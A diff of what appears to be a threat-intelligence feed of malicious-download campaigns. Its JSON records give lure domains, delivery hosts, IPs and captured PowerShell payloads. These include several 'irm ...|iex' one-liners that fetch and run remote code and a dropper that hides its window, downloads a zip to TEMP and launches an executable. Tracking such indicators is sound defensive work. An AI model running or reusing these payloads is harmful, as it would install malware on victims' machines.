@@ -1,5 +1,91 @@
 [
   {
+    "UrlDomain": "jordan-commu.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [
+      "https://jordan-commu.com"
+    ],
+    "IP": [
+      "162.0.229.105"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/0253250b2b50c7ff",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/0253250b2b50c7ff'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/0253250b2b50c7ff"
+    ],
+    "ReportId": "cmwo6iht31y350omldf1s1y9c",
+    "ScannedAt": "2026-11-19T23:26:13.464000+00:00"
+  },
+  {
+    "UrlDomain": "cac.ma",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "41.77.115.130"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwo6bfpc1xut0omlmuild5t3",
+    "ScannedAt": "2026-11-19T23:20:44.145000+00:00"
+  },
+  {
+    "UrlDomain": "intuit-office-login.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/hn/6b4fae7bb06cf009"
+    ],
+    "IP": [
+      "172.67.148.16"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/hn/6b4fae7bb06cf009')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/hn/6b4fae7bb06cf009"
+    ],
+    "ReportId": "cmwo6a5551xu40omla5b849lo",
+    "ScannedAt": "2026-11-19T23:19:43.828000+00:00"
+  },
+  {
+    "UrlDomain": "darlana.com.sa",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [
+      "https://darlana.com.sa/"
+    ],
+    "IP": [
+      "172.67.216.58"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/4e816a63fc53eaa4",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/4e816a63fc53eaa4'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/4e816a63fc53eaa4"
+    ],
+    "ReportId": "cmwo69tad1xsb0omltg23i5hb",
+    "ScannedAt": "2026-11-19T23:19:28.448000+00:00"
+  },
+  {
     "UrlDomain": "prosper.services",
     "DeliveryUrl": [
       "baseupdate2798.com"
@@ -821,35 +907,5 @@
     ],
     "ReportId": "cmwms5p8k1uev0omlqz8p9obh",
     "ScannedAt": "2026-11-18T23:56:35.729000+00:00"
-  },
-  {
-    "UrlDomain": "sailingservant.org",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "158.69.54.116"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/336728d213008c22",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae&amp;_v=29917395",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae&_v=29917395",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/336728d213008c22'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/336728d213008c22"
-    ],
-    "ReportId": "cmwmqp0cv1uc20oml7a6uzgnn",
-    "ScannedAt": "2026-11-18T23:15:37.353000+00:00"
   }
 ]
